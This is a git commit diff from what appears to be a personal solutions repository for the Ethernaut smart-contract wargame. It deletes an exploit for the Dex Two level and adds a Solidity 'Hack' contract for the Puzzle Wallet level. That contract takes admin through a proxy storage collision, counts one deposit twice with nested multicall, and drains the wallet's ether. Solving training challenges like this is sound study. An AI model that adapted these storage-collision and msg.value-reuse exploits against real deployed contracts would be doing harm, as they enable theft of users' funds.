7da97f24bb81395cf0044fc2e5937fe02d80c526
Çağatay Akkaş <108520279+CagatayAkkas@users.noreply.github.com>
2023-04-25 10:25:15 +0300

    Add files via upload

--- Ethernaut/Ethernaut23.sol
+++ Ethernaut/Ethernaut23.sol
@@ -1,86 +1,48 @@
-pragma solidity ^0.8.13;
+pragma solidity ^0.8;
 
-interface IDex {
-    function token1() external view returns (address);
-    function token2() external view returns (address);
-    function swap(address from, address to, uint256 amount) external;
+interface IWallet {
+    function admin() external view returns (address);
+
+    function proposeNewAdmin(address _newAdmin) external;
+
+    function addToWhitelist(address addr) external;
+
+    function deposit() external payable;
+
+    function multicall(bytes[] calldata data) external payable;
+
+    function execute(
+        address to,
+        uint256 value,
+        bytes calldata data
+    ) external payable;
+
+    function setMaxBalance(uint256 _maxBalance) external;
 }
 
-interface IERC20 {
-    function totalSupply() external view returns (uint256);
-    function balanceOf(address account) external view returns (uint256);
-    function transfer(address recipient,uint256 amount) external returns (bool);
-    function allowance(address owner,address spender) external view returns (uint256);
-    function approve(address spender, uint256 amount) external returns (bool);
-    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
-    event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval(address indexed owner,address indexed spender,uint256 value);
-}
+contract Hack {
+    constructor(IWallet wallet) payable {
+        // overwrite wallet owner
+        wallet.proposeNewAdmin(address(this));
+        wallet.addToWhitelist(address(this));
 
-contract Attack {
-    constructor(IDex dex) {
-        IERC20 token1 = IERC20(dex.token1());
-        IERC20 token2 = IERC20(dex.token2());
+        bytes[] memory deposit_data = new bytes[](1);
+        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);
 
-        MyToken myToken1 = new MyToken();
-        MyToken myToken2 = new MyToken();
+        bytes[] memory data = new bytes[](2);
+        // deposit
+        data[0] = deposit_data[0];
+        // multicall -> deposit
+        data[1] = abi.encodeWithSelector(
+            wallet.multicall.selector,
+            deposit_data
+        );
+        wallet.multicall{value: 0.001 ether}(data);
 
-        myToken1.mint(2);
-        myToken2.mint(2);
+        // withdraw Upgradeable Proxy Pattern with Unstructured Storage
+        wallet.execute(msg.sender, 0.002 ether, "");
 
-        myToken1.transfer(address(dex), 1);
-        myToken2.transfer(address(dex), 1);
-
-        myToken1.approve(address(dex), 1);
-        myToken2.approve(address(dex), 1);
-
-        dex.swap(address(myToken1), address(token1), 1);
-        dex.swap(address(myToken2), address(token2), 1);
-    }
-}
-
-contract MyToken is IERC20 {
-    uint256 public totalSupply;
-    mapping(address => uint256) public balanceOf;
-    mapping(address => mapping(address => uint256)) public allowance;
-
-    function transfer(
-        address recipient,
-        uint256 amount
-    ) external returns (bool) {
-        balanceOf[msg.sender] -= amount;
-        balanceOf[recipient] += amount;
-        emit Transfer(msg.sender, recipient, amount);
-        return true;
-    }
-
-    function approve(address spender, uint256 amount) external returns (bool) {
-        allowance[msg.sender][spender] = amount;
-        emit Approval(msg.sender, spender, amount);
-        return true;
-    }
-
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool) {
-        allowance[sender][msg.sender] -= amount;
-        balanceOf[sender] -= amount;
-        balanceOf[recipient] += amount;
-        emit Transfer(sender, recipient, amount);
-        return true;
-    }
-
-    function mint(uint256 amount) external {
-        balanceOf[msg.sender] += amount;
-        totalSupply += amount;
-        emit Transfer(address(0), msg.sender, amount);
-    }
-
-    function burn(uint256 amount) external {
-        balanceOf[msg.sender] -= amount;
-        totalSupply -= amount;
-        emit Transfer(msg.sender, address(0), amount);
+        // set admin
+        wallet.setMaxBalance(uint256(uint160(msg.sender)));
     }
 }
